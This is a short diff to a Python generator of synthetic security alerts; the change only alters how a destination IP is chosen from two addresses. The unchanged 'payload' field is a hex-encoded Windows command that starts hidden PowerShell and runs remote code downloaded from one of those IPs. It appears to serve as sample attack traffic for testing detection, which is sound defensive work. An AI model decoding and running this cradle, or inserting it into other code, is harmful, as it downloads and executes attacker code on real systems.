@@ -19,7 +19,7 @@ sig_ids = [
 def generate_event():
   sig_id_data = random.choice(sig_ids)
   src = random.choice(user_devices_2)
-  address_malicious = ["88.198.16.134", '46.17.97.37']
+  dst = random.choice(["88.198.16.134", '46.17.97.37'])
   return {
     "timestamp": int(time.time()),
     "payload": '636d642e657865202f6320706f7765727368656c6c202d6e6f70202d772068696464656e202d632022494558202828286e65772d6f626a656374206e65742e776562636c69656e74292e646f776e6c6f6164737472696e67282768747470733a2f2f34362e31372e39372e33372f5365727665726d61632e70687027292929220a',
@@ -53,8 +53,8 @@ def generate_event():
     "dst_port_name": "443",
     "src_asnum": 4110056778,
     "dst_asnum": "3038642698",
-    "dst_name": random.choice(address_malicious),
-    "dst": random.choice(address_malicious),
+    "dst_name": str(dst),
+    "dst": dst,
     "ttl": 47,
     "tos": 0,
     "id": 0,
